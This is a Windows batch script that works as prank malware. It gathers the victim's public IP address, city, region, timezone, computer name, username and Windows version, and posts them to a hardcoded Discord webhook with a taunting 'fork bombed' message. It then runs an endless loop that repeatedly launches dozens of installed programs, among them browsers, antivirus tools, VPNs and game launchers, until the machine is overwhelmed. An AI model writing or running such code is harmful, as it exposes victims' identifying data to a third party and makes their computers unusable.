@echo off
setlocal

:: Fetch location info using PowerShell
for /f "delims=" %%a in ('powershell -Command "(Invoke-RestMethod 'https://ipinfo.io/json').city"') do set city=%%a
for /f "delims=" %%a in ('powershell -Command "(Invoke-RestMethod 'https://ipinfo.io/json').region"') do set region=%%a
for /f "delims=" %%a in ('powershell -Command "(Invoke-RestMethod 'https://ipinfo.io/json').timezone"') do set timezone=%%a

:: Get current time in that timezone
for /f "delims=" %%a in ('powershell -Command "[System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date), '%timezone%').ToString('HH:mm:ss')"') do set localtime=%%a

echo Your city: %city%
echo Your region: %region%
echo Your timezone: %timezone%
echo Your local time: %localtime%

:: --- Webhook URL ---
set "webhook=https://discord.com/api/webhooks/1441098063870431335/XVnPrzfpbkbbdPH-XonYAPHvTSSbABliTCJHHZk40UfoXU3TeD6XAuJUbPPObv4vTkpH"

:: --- Get system info ---
set "pcname=%COMPUTERNAME%"
set "username=%USERNAME%"

:: Get Windows version
for /f "tokens=4-5 delims=[.] " %%i in ('ver') do set "version=%%i.%%j"

:: Get timestamp
for /f "tokens=1-4 delims=/: " %%a in ("%date% %time%") do (
    set "ts=%%a/%%b/%%c %%d"
)

:: --- Get PUBLIC IP but do not send it anywhere else ---
for /f "usebackq tokens=* delims=" %%a in (`powershell -NoProfile -Command "(Invoke-WebRequest -URI 'https://api.ipify.org').Content"`) do (
    set "myip=%%a"
)

:: --- Send multi-line code block to webhook using escaped newlines ---
powershell -NoProfile -Command "$uri='%webhook%'; $content='```Ip: %myip% | City %city% | Region %Region% | Timezone %timezone% | LocalTime %localtime%| PC Name: %pcname% | Username: %username% | Windows Version: %version% | Timestamp: %ts% |This Person Has Been forked  bombed Bombed ```'; $body=@{content=$content} | ConvertTo-Json; Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json'"

:x
:: --- SYSTEM APPS ---
call :runIfExists "C:\Windows\System32\notepad.exe"
call :runIfExists "C:\Windows\System32\cmd.exe"
call :runIfExists "C:\Windows\System32\mspaint.exe"

:: --- BROWSERS ---
call :runIfExists "C:\Program Files\Google\Chrome\Application\chrome.exe"
call :runIfExists "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
call :runIfExists "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
call :runIfExists "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
call :runIfExists "C:\Program Files\Opera\launcher.exe"
call :runIfExists "C:\Program Files\Mozilla Firefox\firefox.exe"
call :runIfExists "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
call :runIfExists "C:\Program Files\Multilogin\Multilogin.exe"

:: --- SECURITY & ANTIVIRUS ---
call :runIfExists "C:\Program Files\Norton Security\NortonSecurity.exe"
call :runIfExists "C:\Program Files\AVG\Antivirus\AVGUI.exe"
call :runIfExists "C:\Program Files\Avira\Avira.exe"
call :runIfExists "C:\Program Files\Malwarebytes\Anti-Malware\mbam.exe"
call :runIfExists "C:\Program Files\Bitdefender\Bitdefender.exe"
call :runIfExists "C:\Program Files\McAfee\mcafee.exe"
call :runIfExists "C:\Program Files\TotalAV\TotalAV.exe"
call :runIfExists "C:\Program Files\Trend Micro\TrendMicro.exe"
call :runIfExists "C:\Program Files\ESET\ESET Security\ESET.exe"
call :runIfExists "C:\Program Files\Windows Defender\MSASCui.exe"

:: --- VPNs ---
call :runIfExists "%ProgramFiles%\ProtonVPN\ProtonVPN.exe"
call :runIfExists "%ProgramFiles%\ProtonMail\ProtonMail.exe"
call :runIfExists "%ProgramFiles%\Proton Pass\ProtonPass.exe"
call :runIfExists "%ProgramFiles%\Proton Drive\ProtonDrive.exe"
call :runIfExists "%ProgramFiles%\Warp\Warp.exe"
call :runIfExists "%ProgramFiles%\X-VPN\X-VPN.exe"
call :runIfExists "%ProgramFiles%\Planet VPN\PlanetVPN.exe"
call :runIfExists "%ProgramFiles%\Windscribe\Windscribe.exe"
call :runIfExists "%ProgramFiles%\Avast SecureLine VPN\AvastSecureLine.exe"
call :runIfExists "%ProgramFiles%\Turbo VPN\TurboVPN.exe"
call :runIfExists "%ProgramFiles%\Hotspot Shield\HotspotShield.exe"

:: --- OFFICE & CLOUD ---
call :runIfExists "%ProgramFiles%\Microsoft Office\root\Office16\WINWORD.EXE"
call :runIfExists "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE"
call :runIfExists "%ProgramFiles%\Microsoft Office\root\Office16\OUTLOOK.EXE"
call :runIfExists "%ProgramFiles%\Microsoft Office\root\Office16\POWERPNT.EXE"
call :runIfExists "%ProgramFiles%\Microsoft OneDrive\OneDrive.exe"

:: --- COMMUNICATION ---
call :runIfExists "%LocalAppData%\Discord\Update.exe"
call :runIfExists "%LocalAppData%\Discord\app-*\Discord.exe"
call :runIfExists "%AppData%\Skype\Skype.exe"
call :runIfExists "%AppData%\Slack\Slack.exe"
call :runIfExists "%ProgramFiles%\WhatsApp\WhatsApp.exe"
call :runIfExists "C:\Program Files\TeamViewer\TeamViewer.exe"

:: --- MEDIA & MULTIMEDIA ---
call :runIfExists "%AppData%\Spotify\Spotify.exe"
call :runIfExists "C:\Program Files\VLC\vlc.exe"
call :runIfExists "C:\Program Files (x86)\VLC\vlc.exe"
call :runIfExists "%ProgramFiles%\CapCut\CapCut.exe"
call :runIfExists "%ProgramFiles%\OBS Studio\bin\64bit\obs64.exe"
call :runIfExists "%ProgramFiles%\Paint.NET\PaintDotNet.exe"
call :runIfExists "%ProgramFiles%\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"

:: --- DOWNLOAD & FILE TOOLS ---
call :runIfExists "C:\Program Files\Internet Download Manager\IDMan.exe"
call :runIfExists "C:\Program Files\7-Zip\7zFM.exe"
call :runIfExists "C:\Program Files (x86)\7-Zip\7zFM.exe"
call :runIfExists "%ProgramFiles%\SHAREit\SHAREit.exe"
call :runIfExists "%ProgramFiles%\Google\Drive\googledrivesync.exe"
call :runIfExists "C:\Program Files (x86)\Google\Drive\googledrivesync.exe"
call :runIfExists "%ProgramFiles%\Google\Photos\Photos.exe"

:: --- GAMING LAUNCHERS ---
call :runIfExists "%LocalAppData%\Roblox\Versions\RobloxPlayerBeta.exe"
call :runIfExists "C:\Program Files (x86)\Steam\steam.exe"
call :runIfExists "C:\Program Files\Steam\steam.exe"
call :runIfExists "C:\Program Files\Epic Games\Launcher\Portal\Binaries\Win32\EpicGamesLauncher.exe"
call :runIfExists "C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe"
call :runIfExists "C:\Program Files\Rockstar Games\Grand Theft Auto V\GTAVLauncher.exe"
call :runIfExists "C:\Program Files\Riot Games\Riot Client\RiotClientServices.exe"
call :runIfExists "C:\Program Files\Battle.net\Battle.net Launcher.exe"
call :runIfExists "C:\Program Files\Minecraft Launcher\MinecraftLauncher.exe"
call :runIfExists "%LocalAppData%\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\MinecraftUWP.exe"  :: Bedrock
call :runIfExists "%ProgramFiles%\Xbox\XboxApp.exe"

:: --- OTHER STANDARD APPS ---
call :runIfExists "%ProgramFiles%\WindowsApps\Microsoft.WindowsStore_*\WinStore.App.exe"
call :runIfExists "%ProgramFiles%\WindowsApps\Microsoft.Windows.Photos_*\Photos.exe"
call :runIfExists "%ProgramFiles%\WindowsApps\Microsoft.WindowsAlarms_*\Clock.exe"
call :runIfExists "%ProgramFiles%\Notion\Notion.exe"
call :runIfExists "%ProgramFiles%\Zoom\bin\Zoom.exe"

goto x

:: --------- FUNCTION ----------
:runIfExists
for %%A in (%*) do (
    if exist "%%~A" (
        start "" "%%~A"
    )
)
exit /b
